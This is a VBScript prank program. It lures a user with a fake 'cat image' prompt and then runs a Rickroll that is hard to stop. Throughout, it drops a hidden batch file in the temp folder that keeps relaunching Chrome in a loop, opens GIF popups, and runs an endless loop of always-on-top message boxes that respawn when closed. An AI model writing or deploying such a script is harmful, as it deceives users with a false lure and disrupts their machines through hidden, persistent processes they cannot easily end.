' --- THE SNEAKY TRAP ---
Dim result
result = MsgBox("hi friend" & vbNewLine & "if you want to see a cat image press yes to continue :)", vbYesNo + vbQuestion, "Cat Image?")

' Check if they clicked "No"
If result <> vbYes Then
    WScript.Quit ' Safely exit if they don't press Yes
End If

' --- THE RICKROLL CHAOS ---
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' 1. Create a hidden background script to force Chrome to stay open
strBatPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\chrome_keeper.bat"
Set objFile = objFSO.CreateTextFile(strBatPath, True)
objFile.WriteLine ":loop"
objFile.WriteLine "tasklist | find /i ""chrome.exe"" >nul"
objFile.WriteLine "if errorlevel 1 start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
objFile.WriteLine "timeout /t 2 /nobreak >nul"
objFile.WriteLine "goto loop"
objFile.Close

' Run the Chrome monitor silently in the background (0 = hidden window)
objShell.Run "cmd /c """ & strBatPath & """", 0, False

' 2. Open the main Rickroll video
objShell.Run "chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ"
WScript.Sleep 2000

' 3. Open the Rickroll GIF as a borderless desktop popup
objShell.Run "chrome --app=https://media.giphy.com/media/l0MYt5jPR6QX5APm0/giphy.gif"

' 4. Start the infinite popup loop
Do
    ' 4096 = System Modal (forces the popup to stay on TOP of all other windows)
    ' Every time they click OK or the X, the loop immediately restarts
    MsgBox "Never gonna give you up!" & vbNewLine & "Never gonna let you down!", 0 + 4096, "🎵 Rick Astley 🎵"
    
    ' Spawn a new GIF popup every time they close the text popup
    objShell.Run "chrome --app=https://media.giphy.com/media/l0MYt5jPR6QX5APm0/giphy.gif"
Loop